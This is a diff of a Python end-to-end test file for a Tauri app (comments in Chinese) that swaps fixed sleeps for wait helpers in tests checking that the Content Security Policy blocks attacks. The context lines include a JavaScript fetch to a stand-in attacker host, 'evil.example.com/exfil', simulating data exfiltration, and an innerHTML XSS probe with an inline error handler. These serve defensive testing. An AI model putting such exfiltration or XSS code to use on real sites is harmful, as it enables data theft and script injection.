@@ -8,11 +8,13 @@
 3. CSP 阻止 XSS via innerHTML（script-src 'self' 阻止 inline event handler）
 4. localStorage 不持久化 access_token
 """
+
 import os
-import time
+
 import pytest
 
 from tests.e2e.helpers.cdp_client import CdpClient
+from tests.e2e.helpers.waiters import wait_for, wait_for_dom_ready
 
 CDP_PORT = int(os.getenv("CDP_PORT", "9223"))
 TAURI_HOME = "http://tauri.localhost/"
@@ -36,9 +38,10 @@ def test_csp_blocks_external_fetch(cdp):
     CSP connect-src 'self' http://localhost:8000 应阻止到外部域名的 fetch。
     """
     cdp.navigate(TAURI_HOME)
-    time.sleep(2)
+    wait_for_dom_ready(cdp, timeout=10)
     # 尝试 fetch 外部域名（应被 CSP 阻止）
-    result = cdp.evaluate("""
+    result = cdp.evaluate(
+        """
         (async function() {
             try {
                 await fetch('https://evil.example.com/exfil', {
@@ -50,10 +53,11 @@ def test_csp_blocks_external_fetch(cdp):
                 return 'BLOCKED: ' + e.message;
             }
         })();
-    """, await_promise=True)
+    """,
+        await_promise=True,
+    )
     assert result != "SUCCESS", f"CSP did not block external fetch: {result}"
-    assert "BLOCKED" in result or "Failed to fetch" in result, \
-        f"Unexpected fetch result: {result}"
+    assert "BLOCKED" in result or "Failed to fetch" in result, f"Unexpected fetch result: {result}"
 
 
 def test_csp_blocks_javascript_uri(cdp):
@@ -91,8 +95,17 @@ def test_no_xss_via_innerhtml(cdp):
             document.body.appendChild(div);
         })();
     """)
-    time.sleep(1)
-    triggered = cdp.evaluate("window.__xss_triggered === true")
+    # 等待 onerror 触发（若触发则 XSS 未被阻止）；1s 内未触发视为未触发
+    try:
+        wait_for(
+            lambda: cdp.evaluate("window.__xss_triggered === true"),
+            timeout=1,
+            interval=0.1,
+            message="XSS trigger check",
+        )
+        triggered = True
+    except TimeoutError:
+        triggered = False
     # CSP script-src 'self' 应阻止 inline event handler
     assert not triggered, "XSS via innerHTML was triggered (CSP failed to block inline handler)"
     # 清理
